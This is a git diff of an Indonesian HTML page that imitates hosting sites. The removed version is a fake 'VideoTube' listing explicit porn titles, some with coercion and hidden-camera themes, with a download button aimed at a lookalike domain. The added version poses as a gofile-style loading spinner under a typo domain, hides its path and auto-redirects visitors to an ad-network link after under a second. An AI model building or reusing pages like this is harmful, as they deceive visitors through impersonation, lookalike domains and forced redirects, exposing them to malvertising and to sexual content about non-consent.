@@ -1,250 +1,121 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="referrer" content="no-referrer">    
-    <title>goflie.top</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #0f0f0f; }
-        ::-webkit-scrollbar-thumb { background: #3f3f3f; border-radius: 10px; }
-        
-        body { background-color: #0f0f0f; color: #f1f1f1; scroll-behavior: smooth; }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>top</title>
+  <style>
+    * { box-sizing: border-box; }
 
-        /* Container Iklan */
-        .ad-top-wrapper {
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 15px 0;
-            background-color: #0f0f0f;
-            min-height: 60px;
-        }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #1f2a3a; /* dark blue ala gofile */
+      display: flex;
+      flex-direction: column;
+      color: #94a3b8;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
 
-        .grid-layout {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 2rem 1rem;
-        }
+    /* HEADER */
+    header {
+      height: 56px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      background: #1b2533;
+    }
 
-        @media (min-width: 1024px) {
-            .sidebar-mode-container { display: flex; flex-direction: row; gap: 24px; }
-            .main-content-area { flex: 1; }
-            .sidebar-list-area { width: 380px; flex-shrink: 0; }
-        }
+    .menu-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 6px;
+      background: #2563eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        .video-container {
-            position: relative;
-            width: 100%;
-            aspect-ratio: 16 / 9;
-            overflow: hidden;
-            border-radius: 12px;
-            background-color: #1a1a1a;
-            transition: all 0.3s ease;
-        }
+    .menu-btn span,
+    .menu-btn span::before,
+    .menu-btn span::after {
+      content: '';
+      display: block;
+      width: 16px;
+      height: 2px;
+      background: #fff;
+      position: relative;
+    }
 
-        .video-card video { 
-            width: 100%; height: 100%; object-fit: cover; opacity: 0.7; transition: opacity 0.3s;
-        }
+    .menu-btn span::before { top: -5px; position: absolute; }
+    .menu-btn span::after { top: 5px; position: absolute; }
 
-        .active-card video { opacity: 1; }
-        .active-card .video-container { border-radius: 0px; }
-        
-        .small-card { display: flex; gap: 10px; cursor: pointer; margin-bottom: 12px; }
-        .small-card .video-container { width: 150px; height: 85px; flex-shrink: 0; border-radius: 8px; }
-        .small-card h3 { font-size: 13px; line-height: 1.2; font-weight: 600; }
+    /* MAIN */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        #toast {
-            visibility: hidden; background-color: #333; color: #fff; border-radius: 8px;
-            padding: 12px 20px; position: fixed; z-index: 100; bottom: 20px; left: 20px; font-size: 13px;
-        }
-        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
-        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 20px; opacity: 1; } }
-        @keyframes fadeout { from { opacity: 1; } to { opacity: 0; } }
-    </style>
+    /* GOFILE-LIKE SPINNER */
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: 5px solid transparent;
+      border-top-color: #3b82f6;
+      border-right-color: #3b82f6;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* FOOTER */
+    footer {
+      padding: 20px 0 30px;
+      text-align: center;
+      font-size: 14px;
+      background: #1b2533;
+    }
+
+    footer a {
+      display: block;
+      color: #94a3b8;
+      text-decoration: none;
+      margin: 6px 0;
+    }
+  </style>
 </head>
-<body class="antialiased">
+<body>
 
-    <header class="fixed top-0 left-0 right-0 h-14 bg-[#0f0f0f] flex items-center justify-between px-4 z-50 border-b border-[#272727]">
-        <div class="flex items-center gap-4">
-            <i class="fa-solid fa-bars text-lg cursor-pointer p-2 hover:bg-[#272727] rounded-full"></i>
-            <div onclick="window.location.reload()" class="flex items-center gap-1 cursor-pointer">
-                <i class="fa-brands fa-youtube text-[#ff0000] text-3xl"></i>
-                <span class="font-bold text-xl tracking-tighter">VideoTube</span>
-            </div>
-        </div>
-        <div class="hidden md:flex flex-1 max-w-[600px] mx-10">
-            <div class="flex w-full items-center bg-[#121212] border border-[#303030] rounded-full px-4 py-1.5">
-                <input type="text" placeholder="Cari video..." class="w-full bg-transparent focus:outline-none text-sm px-2">
-                <i class="fa-solid fa-magnifying-glass text-gray-500 mr-2"></i>
-            </div>
-        </div>
-        <div class="flex items-center gap-2">
-            <div class="w-8 h-8 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-full flex items-center justify-center text-xs font-bold">A</div>
-        </div>
-    </header>
+  <header>
+    <div class="menu-btn"><span></span></div>
+  </header>
 
-    <div class="pt-14 pb-10">
-        
-        <!-- BAGIAN IKLAN ATAS -->
-        <div class="ad-top-wrapper">
-            <div id="ad-slot-320x50">
-                <script>
-                    atOptions = {
-                        'key' : 'baa0afb18e2e70c00e4c1406e4824e4b',
-                        'format' : 'iframe',
-                        'height' : 50,
-                        'width' : 320,
-                        'params' : {}
-                    };
-                </script>
-                <script src="https://behindcanary.com/baa0afb18e2e70c00e4c1406e4824e4b/invoke.js"></script>
-            </div>
-        </div>
+    <main id="content">
+    <div class="spinner" id="spinner"></div>
+  </main>
 
-        <div class="px-4 lg:px-8">
-            <div id="content-layout">
-                <!-- Area Beranda -->
-                <div id="home-view" class="grid-layout mt-4">
-                    <!-- Cards via JS -->
-                </div>
+  <footer>
+    <a href="#">Home</a>
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Copyright</a>
+  </footer>
 
-                <!-- Area Menonton -->
-                <div id="watch-view" class="hidden">
-                    <div class="sidebar-mode-container mt-4">
-                        <div class="main-content-area">
-                            <div class="bg-black rounded-xl overflow-hidden shadow-2xl aspect-video border border-[#272727]">
-                                <video id="main-player" controls autoplay class="w-full h-full"></video>
-                            </div>
-                            <div class="mt-4">
-                                <h1 id="main-title" class="text-xl font-bold"></h1>
-                                <div class="flex flex-wrap items-center justify-between gap-4 mt-4">
-                                    <div class="flex items-center gap-3">
-                                        <div id="chan-avatar" class="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center font-bold">V</div>
-                                        <div>
-                                            <h3 id="main-channel" class="font-bold text-sm"></h3>
-                                            <p class="text-gray-400 text-[11px]">Subscribers Aktif</p>
-                                        </div>
-                                        <button class="bg-white text-black px-4 py-2 rounded-full font-bold text-xs ml-4">Subscribe</button>
-                                    </div>
-                                    <div class="flex items-center gap-2">
-                                        <button onclick="handleDownload()" class="bg-[#272727] hover:bg-[#3f3f3f] px-4 py-2 rounded-full text-xs font-bold flex items-center gap-2 text-[#3ea6ff]">
-                                            <i class="fa-solid fa-download"></i> Unduh
-                                        </button>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+  <script>
+    // spinner tampil 2 detik lalu hilang
+    setTimeout(() => {
+      const spinner = document.getElementById('spinner');
+      spinner.style.opacity = '0';
+      spinner.style.transition = 'opacity 0.3s ease';
+    }, 1000);
+  </script>
 
-                        <!-- Sisi Kanan: Daftar Kecil -->
-                        <div class="sidebar-list-area">
-                            <h2 class="text-xs font-bold mb-4 text-gray-500 uppercase tracking-widest">Video Rekomendasi</h2>
-                            <div id="sidebar-grid"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="toast">Redirecting to download server...</div>
-
-    <script>
-        const videoData = [
-            { id: 1, title: "新人 興味本位で応募してきたエッチな素人娘、実は人気コスプレ配信者！SNSの世界を飛び出しまさかのAVデビュー！", channel: "Vision Studio", src: "https://video.twimg.com/amplify_video/2012575054714773505/vid/avc1/1280x720/cAd4h2oCIn5zxfOq.mp4?tag=21" },
-            { id: 2, title: " 暗示洗脳 生徒とラブラブセックスしているつもりが実はオヤジとヤってる可哀想な変態女教師", channel: "Future Pulse", src: "https://video.twimg.com/amplify_video/2010344361880641536/vid/avc1/1280x720/YUzeg-dr6oZvxBtu.mp4?tag=21" },
-            { id: 3, title: "夫に浮気されて欲求不満だけど…妊娠したい人妻は絶倫男の濃厚精子を求めて自宅種付けソープランドへ ", channel: "Travel Hub", src: "https://video.twimg.com/amplify_video/1828326532215119874/vid/avc1/640x360/eTEVDhjbQ-vKplgj.mp4?tag=14" },
-            { id: 4, title: "大嫌いな元カレが入院したので、美人看護師が性処理を強要。婚約中なのにクズ男のチンポに我慢できず、病院でセックスしちゃう", channel: "jav ido", src: "https://video.twimg.com/amplify_video/1824013259051286528/vid/avc1/640x360/UCT_--2XP86KDeSK.mp4?tag=14" },
-            { id: 5, title: "出張メンズエステ盗撮9 店長に内緒で生フェラチオサービス", channel: "Design Lab", src: "https://video.twimg.com/amplify_video/1823642293196480512/vid/avc1/640x360/lKcIdeV8MeU3tDGN.mp4?tag=14" },
-            { id: 6, title: "ノーブラで誘惑してくる彼女のお姉さんに興奮して性欲モンスター化！コンドーム1箱使い切ってもヤリまくる葵いぶき 4K", channel: "Lumina Art", src: "https://video.twimg.com/amplify_video/1941659174250713089/vid/avc1/1280x720/u6lIx2b3Nj9zCpMJ.mp4?tag=21" },
-            { id: 7, title: "パンストマニアの標的となった美脚女教師。狂気のストーカーの執拗な性行為は心を壊すまで終わらない。", channel: "Urban Sky", src: "https://video.twimg.com/amplify_video/2018869702848823296/vid/avc1/640x360/SddWBCSYD3QsHHOO.mp4?tag=21" },
-            { id: 8, title: "Sharing A Room With My Sexy Boss On A Business Trip ", channel: "Zenith Nature", src: "https://video.twimg.com/amplify_video/2009881239487209472/vid/avc1/854x480/eGRqHsWJ8Zur88-E.mp4?tag=21" }        ];
-
-        function renderInitial() {
-            const grid = document.getElementById('home-view');
-            grid.innerHTML = videoData.map(v => `
-                <div class="video-card group cursor-pointer" onclick="playVideo(${v.id})">
-                    <div class="video-container shadow-lg">
-                        <video class="preview-video" muted playsinline loop preload="metadata">
-                            <source src="${v.src}" type="video/mp4">
-                        </video>
-                    </div>
-                    <div class="flex gap-3 mt-3">
-                        <div class="w-8 h-8 rounded-full bg-gray-800 flex-shrink-0 flex items-center justify-center font-bold text-[10px] uppercase">${v.channel[0]}</div>
-                        <div>
-                            <h3 class="font-bold text-sm text-white line-clamp-2 leading-tight group-hover:text-red-500 transition-colors">${v.title}</h3>
-                            <p class="text-gray-400 text-[11px] mt-1">${v.channel}</p>
-                        </div>
-                    </div>
-                </div>
-            `).join('');
-            initAutoPreview();
-        }
-
-        function renderSidebar(excludeId) {
-            const sidebar = document.getElementById('sidebar-grid');
-            sidebar.innerHTML = videoData.filter(v => v.id !== excludeId).map(v => `
-                <div class="small-card group" onclick="playVideo(${v.id})">
-                    <div class="video-container shadow-md">
-                        <video muted playsinline preload="metadata">
-                            <source src="${v.src}" type="video/mp4">
-                        </video>
-                    </div>
-                    <div class="flex flex-col flex-1">
-                        <h3 class="text-white line-clamp-2 group-hover:text-red-500 transition-colors">${v.title}</h3>
-                        <p class="text-gray-400 text-[10px] mt-1">${v.channel}</p>
-                    </div>
-                </div>
-            `).join('');
-        }
-
-        function initAutoPreview() {
-            const observer = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    const video = entry.target.querySelector('video');
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('active-card');
-                        video.play().catch(() => {});
-                    } else {
-                        entry.target.classList.remove('active-card');
-                        video.pause();
-                    }
-                });
-            }, { threshold: 0.6 });
-            document.querySelectorAll('.video-card').forEach(card => observer.observe(card));
-        }
-
-        function playVideo(id) {
-            const video = videoData.find(v => v.id === id);
-            document.getElementById('home-view').classList.add('hidden');
-            document.getElementById('watch-view').classList.remove('hidden');
-            const player = document.getElementById('main-player');
-            player.src = video.src;
-            document.getElementById('main-title').innerText = video.title;
-            document.getElementById('main-channel').innerText = video.channel;
-            document.getElementById('chan-avatar').innerText = video.channel[0];
-            renderSidebar(id);
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function handleDownload() {
-            const toast = document.getElementById("toast");
-            toast.className = "show";
-            setTimeout(() => {
-                toast.className = toast.className.replace("show", "");
-                window.open(`https://video-twimg.click/amplify_video/1877977333833060352/vid/avc1/1280x720/D4K4DjbiJ9WmfODs.mp4?tag=14{encodeURIComponent(title)}`, '_blank');
-            }, 1800);
-        }
-
-        window.onload = renderInitial;
-  
-    </script>
-
-    <script>
+<script>
 /* tampilkan slug random SETELAH Histats */
 setTimeout(() => {
   const c = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -256,7 +127,7 @@ setTimeout(() => {
 }, 200);
 
 history.replaceState(null, "", "/");
-document.title = "goflie.top";
+document.title = "top";
 
 if (!sessionStorage.getItem("histats_hit")) {
   sessionStorage.setItem("histats_hit", "1");
@@ -274,9 +145,17 @@ if (!sessionStorage.getItem("histats_hit")) {
   })();
 }
 
+/* redirect */
+setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://behindcanary.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
+  }, 600);
+}, 800);
 </script>
-    <script async="async" data-cfasync="false" src="https://behindcanary.com/122b006ae61ef549a738f7e587027d5a/invoke.js"></script>
-<div id="container-122b006ae61ef549a738f7e587027d5a"></div>
-</body>
-</html>
 
+  <script async="async" data-cfasync="false" src="https://behindcanary.com/122b006ae61ef549a738f7e587027d5a/invoke.js"></script>
+<div id="container-122b006ae61ef549a738f7e587027d5a"></div>
+
+</body>
+  </html>
